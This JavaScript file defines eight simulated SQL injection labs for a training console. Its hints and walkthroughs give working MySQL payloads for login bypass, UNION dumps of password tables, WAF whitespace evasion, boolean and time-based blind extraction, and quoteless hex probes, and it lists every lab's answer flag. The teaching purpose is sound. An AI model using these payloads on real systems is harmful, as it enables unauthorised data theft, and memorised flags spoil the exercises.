/* ============================================================
   HackRange labs · SQL Injection (8 labs)
   A mock query console. The engine shows the exact SQL formed,
   applies WAF rules, and simulates realistic MySQL behavior:
   errors, UNION column checks, boolean and timing oracles.
   ============================================================ */

function sqlErr(near) {
  return "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" + near + "' at line 1";
}

function unionCols(v) {
  const m = v.match(/union\s+(?:all\s+)?select\s+([^#-]+)/i);
  if (!m) return 0;
  return m[1].trim().split(',').filter(s => s.trim()).length;
}

const PRODUCTS = {
  cols: ['id', 'name', 'price', 'stock'],
  rows: [
    ['1', 'HackRange hoodie', '39.99', '12'],
    ['2', 'Rubber duck (debugging)', '4.50', '3'],
    ['3', 'Mechanical keyboard', '129.00', '5']
  ]
};

const USERS_S4 = {
  cols: ['id', 'name', 'price', 'stock'],
  rows: [
    ['1', 'admin', '$2y$10$oqZ3EhPk1YpSgYQOyCv7P.9KUuHjHqEe1T1vH7cNpB', '0', '0'],
    ['2', 'flagkeeper', 'HR{union_extraction}', '0', '0'],
    ['3', 'student', 'studdy_p4ss', '0', '0']
  ]
};

const USERS_S5 = {
  cols: ['id', 'name', 'price', 'stock'],
  rows: [
    ['1', 'admin', '$2y$10$oqZ3EhPk1YpSgYQOyCv7P.9KUuHjHqEe1T1vH7cNpB', '0', '0'],
    ['2', 'flagkeeper', 'HR{comment_bypass}', '0', '0'],
    ['3', 'student', 'studdy_p4ss', '0', '0']
  ]
};

HR.defineLab({
  id: 'sqli-01', cat: 'sqli', diff: 1,
  title: 'The Classic Bypass',
  brief: 'The club portal has a login page. You have no password, no hash, no database access. You have one thing: the login form sends the username to a query that trusts it. Break authentication with nothing but a username field and your understanding of what the server literally does with your input.',
  env: {
    type: 'query',
    label: 'username',
    placeholder: "username (password field is a random hash you can't see)",
    template: "SELECT * FROM users WHERE username='$IN' AND password='<hashed>'",
    sql: v => "SELECT * FROM users WHERE username='" + v + "' AND password='$2y$10$oqZ3EhP...'",
    run: function (v) {
      const hasQuote = v.indexOf("'") !== -1;
      const orTrue = /or\s+['"]?1['"]?\s*=\s*['"]?1['"]?/i.test(v) || /or\s+'[^']*'\s*=\s*'/i.test(v);
      const commentTail = /(--|#)\s*-?\s*$/.test(v.trim());
      if (hasQuote && (orTrue || commentTail)) {
        return { ok: true, msg: 'Login successful. Welcome back, admin. You are signed in as an administrator.', solved: true };
      }
      if (hasQuote) return { error: sqlErr("'' at line 1") };
      return { msg: 'Invalid username or password.' };
    }
  },
  flag: 'HR{auth_bypassed}',
  flagNote: 'The environment reveals the flag when you get past the login.',
  hints: [
    'The query is: SELECT * FROM users WHERE username=\'YOU\' AND password=\'hash\'. The AND means BOTH conditions must be true. Can you make the second condition disappear?',
    'Two ideas: make the WHERE always true, or end the statement early. One uses OR, the other uses a comment.',
    "Try: ' OR 1=1 -- -  (always true) or admin' -- - (comment out the password check)"
  ],
  walk: 'The server builds <span class="mono">WHERE username=\'YOURINPUT\' AND password=\'$2y$...\'</span>. Inject <span class="mono">\' OR 1=1 -- -</span>: the quote closes the username string, <span class="mono">OR 1=1</span> makes the row match everything, and <span class="mono">-- -</span> comments out the password check entirely. MySQL logs you in as the first user, which is admin. The variant <span class="mono">admin\' -- -</span> skips straight to the admin row without even needing OR. Note the space after -- : in MySQL a comment needs it, and the trailing dash guards against quote-stripping. Broken authentication via SQL injection is still a real, paid, high severity bug class on bounty platforms.',
  study: 'SecLab · Payload Lab · SQL injection context and the UNION ladder.'
});

HR.defineLab({
  id: 'sqli-02', cat: 'sqli', diff: 1,
  title: 'The Oracle Speaks',
  brief: 'A product search page. You suspect injection but you do not know what database sits behind it. Before crafting payloads you need a fingerprint, because MySQL and PostgreSQL and MSSQL all speak slightly different dialects. Fortunately, careless apps scream their identity the moment you annoy them with a single character.',
  env: {
    type: 'query',
    label: 'search',
    placeholder: 'product name...',
    template: "SELECT * FROM products WHERE name LIKE '%$IN%'",
    sql: v => "SELECT * FROM products WHERE name LIKE '%" + v + "%'",
    run: function (v) {
      if (v.indexOf("'") !== -1) return { error: sqlErr(v.slice(0, 12)) };
      const hit = PRODUCTS.rows.filter(r => r[1].toLowerCase().indexOf(v.toLowerCase()) !== -1);
      return hit.length
        ? { msg: hit.length + ' products found.', rows: { cols: PRODUCTS.cols, rows: hit } }
        : { msg: '0 products found.' };
    }
  },
  flagNote: 'Experiment with the search box, then answer: which database product is running behind this page? (one word)',
  hints: [
    'Inject a single quote and read the error message CAREFULLY. Error messages are confessions.',
    'The error says "check the manual that corresponds to my ___ server version". Which product names its server that way?',
    'The exact phrase "check the manual that corresponds to your MySQL server version" appears in MySQL (and MariaDB) errors only.'
  ],
  walk: 'Inject <span class="mono">\'</span> and the app leaks: <span class="mono">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...</span>. That phrasing is unique to MySQL and MariaDB. PostgreSQL would say <span class="mono">org.postgresql.util.PSQLException: ERROR: syntax error at or near</span> and MSSQL would talk about <span class="mono">Unclosed quotation mark</span>. Fingerprinting the engine from errors is step one of every real injection: dialect determines comment syntax (-- vs #), string functions (SUBSTRING vs SUBSTR), and concatenation (CONCAT vs ||). The flag is <span class="mono">HR{mysql}</span>.',
  study: 'SecLab · Payload Lab · database fingerprint section with the error phrase cheat cards.'
});

HR.defineLab({
  id: 'sqli-03', cat: 'sqli', diff: 2,
  title: 'Count the Columns',
  brief: 'You found a category filter on the shop and a quote gets you a syntax error, so injection is live. You want to use a UNION attack to read other tables, but UNION demands that both SELECTs return the SAME number of columns. Guess wrong and the database slaps you. Find out how many columns the products query returns.',
  env: {
    type: 'query',
    label: 'category',
    placeholder: 'toys',
    template: "SELECT id, name, price, stock FROM products WHERE category='$IN'",
    sql: v => "SELECT id, name, price, stock FROM products WHERE category='" + v + "'",
    run: function (v) {
      const ob = v.match(/order\s+by\s+(\d+)/i);
      if (ob) {
        const n = parseInt(ob[1], 10);
        if (n > 4) return { error: "Unknown column '" + n + "' in 'order clause'" };
        return { msg: '3 products found.', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows } };
      }
      const uc = unionCols(v);
      if (uc) {
        if (uc !== 4) return { error: 'The used SELECT statements have a different number of columns' };
        return { msg: '3 products found (plus your injected row).', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows.concat([['?', '?', '?', '?']]) } };
      }
      if (v.indexOf("'") !== -1 && !/#|--/.test(v)) return { error: sqlErr(v.slice(0, 12)) };
      if (v === 'toys') return { msg: '3 products found.', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows } };
      return { msg: '0 products found.' };
    }
  },
  flagNote: 'How many columns does the query return? (a number)',
  hints: [
    'Two techniques reveal column count. The gentle one: ORDER BY 1, then ORDER BY 2, increasing until it errors. The error marks the boundary.',
    'ORDER BY 5 will error here. ORDER BY 4 will not. What does that tell you?',
    'The answer is 4. Confirm with UNION SELECT NULL,NULL,NULL,NULL which succeeds, while 3 or 5 NULLs triggers the column mismatch error.'
  ],
  walk: 'Climb the ORDER BY ladder: <span class="mono">\' ORDER BY 1 -- -</span> works, 2 works, 3 works, 4 works, 5 explodes with <span class="mono">Unknown column \'5\' in \'order clause\'</span>. So the SELECT returns exactly 4 columns. Cross-check with UNION: <span class="mono">\' UNION SELECT NULL,NULL,NULL,NULL -- -</span> renders fine while three or five NULLs produce <span class="mono">The used SELECT statements have a different number of columns</span>. Use NULL placeholders because types must be compatible and NULL fits anywhere. The flag is <span class="mono">HR{4}</span>. Column count is the FIRST thing a professional checks before any UNION data exfiltration.',
  study: 'SecLab · Payload Lab · UNION attack ladder, step 1.'
});

HR.defineLab({
  id: 'sqli-04', cat: 'sqli', diff: 2,
  title: 'The Treasure Table',
  brief: 'Column count known: four. Now do what every attacker dreams of: stop reading products and start reading the USERS table, passwords included. The schema hides from you, but MySQL keeps a map of itself in information_schema, and even without it, guessing table name users is free. Walk out with the flagkeeper password.',
  env: {
    type: 'query',
    label: 'category',
    placeholder: 'toys',
    template: "SELECT id, name, price, stock FROM products WHERE category='$IN'",
    sql: v => "SELECT id, name, price, stock FROM products WHERE category='" + v + "'",
    run: function (v) {
      const uc = unionCols(v);
      if (uc) {
        if (uc !== 4) return { error: 'The used SELECT statements have a different number of columns' };
        if (/from\s+users/i.test(v)) {
          return { msg: '3 products found, plus rows from your injected query.', rows: { cols: USERS_S4.cols, rows: USERS_S4.rows }, solved: true };
        }
        return { msg: '3 products found (plus your injected row).', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows.concat([['?', '?', '?', '?']]) } };
      }
      if (/order\s+by\s+(\d+)/i.test(v)) {
        const n = parseInt(v.match(/order\s+by\s+(\d+)/i)[1], 10);
        if (n > 4) return { error: "Unknown column '" + n + "' in 'order clause'" };
        return { msg: '3 products found.', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows } };
      }
      if (v.indexOf("'") !== -1 && !/#|--/.test(v)) return { error: sqlErr(v.slice(0, 12)) };
      if (v === 'toys') return { msg: '3 products found.', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows } };
      return { msg: '0 products found.' };
    }
  },
  flag: 'HR{union_extraction}',
  flagNote: 'The flag is a password in the users table. Dump it with UNION.',
  hints: [
    'Build on the previous lab: UNION SELECT with exactly 4 columns, pulling from the users table instead of products.',
    "You do not know the users column names yet. In this simulation try the classics: username and password. (In real life you would first query information_schema.columns.)",
    "' UNION SELECT username, password, NULL, NULL FROM users -- -  then find the flagkeeper row."
  ],
  walk: 'The winning query: <span class="mono">\' UNION SELECT username, password, NULL, NULL FROM users -- -</span>. Four columns to match, real column names to satisfy the engine, and the comment to kill the trailing quote. The results grid now mixes product rows with user rows, and flagkeeper\'s password is the flag: <span class="mono">HR{union_extraction}</span>. In production databases the professional sequence is: <span class="mono">UNION SELECT table_name, table_schema, 1, 1 FROM information_schema.tables -- -</span> to map the schema, then <span class="mono">information_schema.columns</span> for column names, then the final dump. Same skeleton, three steps. Never guess when you can ask the database to describe itself.',
  study: 'SecLab · Payload Lab · information_schema and the full UNION playbook.'
});

HR.defineLab({
  id: 'sqli-05', cat: 'sqli', diff: 2,
  title: 'No Spaces Allowed',
  brief: 'The shop installed a WAF rule: any request containing a space character is rejected. The engineer thinks SQL needs spaces. SQL does not care. Comments can BE spaces, and MySQL even treats certain parentheses as separators. Get past the space filter and dump the users table again.',
  env: {
    type: 'query',
    label: 'category',
    placeholder: 'toys',
    template: "SELECT id, name, price, stock FROM products WHERE category='$IN'",
    sql: v => "SELECT id, name, price, stock FROM products WHERE category='" + v + "'",
    waf: [{ re: /\s/, msg: '403 Forbidden: whitespace is not allowed in the category parameter.' }],
    run: function (v) {
      const q = v.replace(/\/\*\*\//g, ' ');
      const uc = unionCols(q);
      if (uc) {
        if (uc !== 4) return { error: 'The used SELECT statements have a different number of columns' };
        if (/from\s+users/i.test(q)) {
          return { msg: '3 products found, plus rows from your injected query.', rows: { cols: USERS_S5.cols, rows: USERS_S5.rows }, solved: true };
        }
        return { msg: '3 products found (plus your injected row).', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows.concat([['?', '?', '?', '?']]) } };
      }
      if (/order\s+by\s+(\d+)/i.test(q)) return { msg: '3 products found.', rows: { cols: PRODUCTS.cols, rows: PRODUCTS.rows } };
      return { msg: '0 products found.' };
    }
  },
  flag: 'HR{comment_bypass}',
  flagNote: 'The flag is a password in the users table. Dump it without using a single space.',
  hints: [
    'You need SQL keywords separated by SOMETHING that is not a space. MySQL treats the comment /* */ as whitespace between tokens.',
    'Replace every space with /**/ and switch the trailing comment to # (it needs no space after it, unlike --).',
    "'/**/UNION/**/SELECT/**/username,password,NULL,NULL/**/FROM/**/users#"
  ],
  walk: 'The WAF rejects any space, so feed MySQL comments instead: <span class="mono">\'/**/UNION/**/SELECT/**/username,password,NULL,NULL/**/FROM/**/users#</span>. MySQL parses <span class="mono">/**/</span> as a token separator exactly like a space, and <span class="mono">#</span> comments out the rest without needing a trailing space. flagkeeper\'s password this time is <span class="mono">HR{comment_bypass}</span>. Other no-space tricks for your toolkit: parentheses in the right places (<span class="mono">UNION(SELECT(...)</span> on some engines) and <span class="mono">+</span> or <span class="mono">%09</span> (tab) when the filter checks for the literal space character only. Whenever a filter blocks a character, ask: what ELSE does the parser accept as that character?',
  study: 'SecLab · Payload Lab · whitespace alternatives card.'
});

HR.defineLab({
  id: 'sqli-06', cat: 'sqli', diff: 3,
  title: 'Blind Truth',
  brief: 'The shop "fixed" everything: errors are swallowed, UNION is blocked, output is just a product count. But look closer: the count CHANGES depending on whether your injected condition is true or false. That is a boolean oracle, and with patience plus a loop, it is as good as full output. Somewhere in the users table sits a password. Extract it one character at a time, blind.',
  env: {
    type: 'query',
    label: 'category',
    placeholder: 'toys',
    template: "SELECT name, price FROM products WHERE category='$IN'",
    sql: v => "SELECT name, price FROM products WHERE category='" + v + "'",
    waf: [{ re: /union/i, msg: '403 Forbidden: the word UNION is not allowed.' }],
    run: function (v) {
      const SECRET = 'HR{z3ro}';
      const like = v.match(/like\s+'([^']*)'/i);
      const eq = v.match(/(select\s+password\s+from\s+users)[\s\S]*?=\s*'([^']*)'/i);
      if (/select\s+password\s+from\s+users/i.test(v)) {
        let guess = null, isPrefix = false;
        if (like) { guess = like[1]; isPrefix = guess.slice(-1) === '%'; }
        else if (eq) { guess = eq[2]; }
        if (guess === null) return { msg: '2 products found.' };
        if (isPrefix) {
          const p = guess.slice(0, -1);
          const hit = SECRET.indexOf(p) === 0;
          return hit
            ? { msg: '2 products found.' }
            : { msg: '0 products found.' };
        }
        if (guess === SECRET) return { msg: '2 products found. The password matches exactly. Query returned data.', solved: true };
        return { msg: SECRET.indexOf(guess) === 0 ? '2 products found.' : '0 products found.' };
      }
      if (v === 'toys') return { msg: '2 products found.' };
      return { msg: '0 products found.' };
    }
  },
  flag: 'HR{z3ro}',
  flagNote: 'The users table password IS the flag. Extract it character by character.',
  hints: [
    'First establish the oracle: \' AND (SELECT password FROM users) LIKE \'H%\' -- - returns 2 products (true) or 0 (false). You just asked the database a yes or no question.',
    'The password starts with HR{ (flag format). Probe the next character by trying letters and digits: HR{a%, HR{b%, ... Each guess is one question.',
    'Automate it! A 10 line Python loop with requests beats typing 30 guesses by hand. The password is short: HR{ + four characters + }.'
  ],
  walk: 'The oracle: <span class="mono">\' AND (SELECT password FROM users) LIKE \'X%\' -- -</span> shows <span class="mono">2 products found</span> when the password starts with X, <span class="mono">0 products</span> otherwise. Walk the alphabet for each position: the password starts with <span class="mono">HR{</span>, then probe <span class="mono">HR{a%</span>, <span class="mono">HR{b%</span>... until each character falls, ending with <span class="mono">HR{z3ro}</span>, which is the flag itself. The pro move is automation: a Python loop that binary searches each position, or <span class="mono">SUBSTRING((SELECT password FROM users),N,1)=\'c\'</span> per position. Blind SQLi is slow but it is STILL full database read: count changes are output, you just have to ask one bit at a time.',
  study: 'SecLab · Payload Lab · blind injection and boolean oracle cards.'
});

HR.defineLab({
  id: 'sqli-07', cat: 'sqli', diff: 3,
  title: 'The Slow Query',
  brief: 'The shop went one step further: now the response is IDENTICAL no matter what you inject. No errors, no counts, nothing. But the response has one property a page cannot fully hide: TIME. If you can make the database sleep conditionally, you get an oracle that no output filter can remove. Master the timing oracle in three steps.',
  env: {
    type: 'query',
    label: 'category',
    placeholder: 'toys',
    template: "SELECT name, price FROM products WHERE category='$IN'",
    sql: v => "SELECT name, price FROM products WHERE category='" + v + "'",
    waf: [{ re: /union/i, msg: '403 Forbidden: the word UNION is not allowed.' }],
    run: function (v) {
      const st = this._t || (this._t = { uncond: false, trueCond: false, falseCond: false });
      const allDone = function () {
        return st.uncond && st.trueCond && st.falseCond;
      };
      const sleep = v.match(/sleep\s*\(\s*(\d+)\s*\)/i);
      if (sleep) {
        const secs = parseInt(sleep[1], 10);
        const cond = v.match(/if\s*\(\s*([^,]+),\s*sleep/i);
        if (!cond) {
          st.uncond = true;
          if (allDone()) return { msg: 'Query completed in ' + secs + '.13 s. Oracle fully controlled: unconditional, true branch and false branch all proven.', solved: true };
          return { msg: 'Query completed in ' + secs + '.13 s. (achievement 1 of 3: unconditional sleep)' };
        }
        const c = cond[1].trim();
        const eqn = c.match(/^(\d+)\s*=\s*(\d+)$/);
        const truth = eqn ? parseInt(eqn[1], 10) === parseInt(eqn[2], 10) : /substring\s*\(\s*\(?\s*select\s+password\s+from\s+users\s*\)?\s*,\s*(\d+)\s*,\s*1\s*\)\s*=\s*'(.+?)'$/i.test(c);
        if (truth) {
          st.trueCond = true;
          if (allDone()) return { msg: 'Query completed in ' + secs + '.09 s. Oracle fully controlled: unconditional, true branch and false branch all proven.', solved: true };
          return { msg: 'Query completed in ' + secs + '.09 s. (achievement 2 of 3: sleeping true condition)' };
        }
        st.falseCond = true;
        if (allDone()) return { msg: 'Query completed in 0.02 s. Oracle fully controlled: unconditional, true branch and false branch all proven.', solved: true };
        return { msg: 'Query completed in 0.02 s. (achievement 3 of 3: fast false condition)' };
      }
      return { msg: 'Query completed in 0.02 s.' };
    }
  },
  flag: 'HR{time_is_an_oracle}',
  flagNote: 'Three achievements unlock the flag: one unconditional sleep, one sleeping true condition, one fast false condition.',
  hints: [
    'Step 1, confirm control: make the query sleep unconditionally with SLEEP(). Syntax: \' AND SLEEP(2) -- -',
    'Step 2, make it conditional: IF(condition, SLEEP(2), 0). A condition that is true, like 1=1, must sleep. Try: \' AND IF(1=1, SLEEP(2), 0) -- -',
    'Step 3, prove both branches: \' AND IF(1=2, SLEEP(2), 0) -- - must return instantly. Control both directions and you own an extraction channel: IF(SUBSTRING((SELECT password FROM users),1,1)=\'H\', SLEEP(2), 0)'
  ],
  walk: 'Step 1: <span class="mono">\' AND SLEEP(2) -- -</span> makes every query take 2 seconds: you can execute SQL. Step 2: <span class="mono">\' AND IF(1=1, SLEEP(2), 0) -- -</span> wraps the sleep in a condition that is TRUE, so the query is slow: you can branch. Step 3: <span class="mono">\' AND IF(1=2, SLEEP(2), 0) -- -</span> is FALSE, so it returns instantly: the branch is honest. With all three proven you have a binary channel through TIME: <span class="mono">IF(SUBSTRING((SELECT password FROM users),1,1)=\'H\', SLEEP(2), 0)</span> asks "is the first character H" and the delay answers. sqlmap calls this technique time-based blind and runs it automatically once you point it at the parameter. The flag is revealed once all three achievements are done: <span class="mono">HR{time_is_an_oracle}</span>.',
  study: 'SecLab · Payload Lab · timing oracle card and the automation note.'
});

HR.defineLab({
  id: 'sqli-08', cat: 'sqli', diff: 4,
  title: 'Quoteless',
  brief: 'The final shop: quotes of both kinds are banned, UNION is banned, and the vulnerable parameter is a NUMBER, so the query does not even use quotes around your input. Sounds airtight. It is not. MySQL has a way to write string literals with ZERO quote characters, and once you can express strings, you can express comparisons, and comparisons are all a blind attack needs. Probe the users password using hex.',
  env: {
    type: 'query',
    label: 'user id',
    placeholder: '1',
    template: "SELECT username, email, is_active FROM users WHERE id=$IN",
    sql: v => "SELECT username, email, is_active FROM users WHERE id=" + v,
    waf: [
      { re: /['"]/, msg: '403 Forbidden: quote characters are not allowed.' },
      { re: /union/i, msg: '403 Forbidden: the word UNION is not allowed.' }
    ],
    run: function (v) {
      const SECRET = 'HR{hex_for_the_win}';
      const USERS = {
        cols: ['username', 'email', 'is_active'],
        rows: [
          ['admin', 'admin@shop.lab', '1'],
          ['flagkeeper', 'flags@shop.lab', '1'],
          ['student', 'student@shop.lab', '0']
        ]
      };
      const like = v.match(/like\s+0x([0-9a-f]+)/i);
      const eq = v.match(/=\s*0x([0-9a-f]+)/i);
      if (/select\s+password\s+from\s+users/i.test(v)) {
        let decoded = null;
        if (like) {
          decoded = like[1].replace(/../g, h => String.fromCharCode(parseInt(h, 16)));
          const isPrefix = decoded.slice(-1) === '%';
          const p = isPrefix ? decoded.slice(0, -1) : decoded;
          const good = SECRET.indexOf(p) === 0 && p.length >= 2;
          if (good) return { msg: 'Query returned data. The hex literal decoded to a correct prefix: ' + p, solved: true };
          return { msg: 'Query returned no data.' };
        }
        if (eq) {
          decoded = eq[1].replace(/../g, h => String.fromCharCode(parseInt(h, 16)));
          if (decoded === SECRET) return { msg: 'Exact match. The password is fully confirmed.', solved: true };
          return { msg: 'Query returned no data.' };
        }
        return { msg: 'Query returned no data. You need a comparison to get an answer.' };
      }
      const n = v.match(/^\d+$/) ? parseInt(v, 10) : NaN;
      if (n >= 1 && n <= 3) return { msg: '1 user found.', rows: { cols: USERS.cols, rows: [USERS.rows[n - 1]] } };
      return { msg: 'Query returned no data.' };
    }
  },
  flag: 'HR{hex_for_the_win}',
  flagNote: 'Probe the password with hex literals. One correct prefix of at least 2 characters reveals the flag.',
  hints: [
    'In MySQL, 0x48 is the same as the string \'H\'. Two hex digits per character, zero quotes needed. Confirm the idea: AND (SELECT password FROM users) LIKE 0x4825 is the prefix probe "starts with H".',
    'Python builds these instantly: \'HR%\' becomes "0x" + "HR%".encode().hex(). The % stays as part of the hex-decoded string, so 0x485225 means the pattern HR%.',
    'Full probe: 1 AND (SELECT password FROM users) LIKE 0x485225 ...then extend the pattern one character at a time.'
  ],
  walk: 'MySQL treats <span class="mono">0x485225</span> as the string <span class="mono">HR%</span> because hex literals ARE string literals. So <span class="mono">1 AND (SELECT password FROM users) LIKE 0x485225</span> asks "does the password start with HR" without a single quote. Build the hex with Python: <span class="mono">"0x" + "HR%".encode().hex()</span> or bash: <span class="mono">echo -n "HR%" | xxd -p</span>. One correct two character prefix here is enough to unlock the flag: <span class="mono">HR{hex_for_the_win}</span>. In the wild you would script prefix extension to walk the whole string, exactly like the blind lab but quote-free. Quote filters are speed bumps, not walls: hex literals, CHAR() functions, and CONCAT of codepoints all speak without quotes.',
  study: 'SecLab · Payload Lab · hex literal card in the filter bypass section.'
});
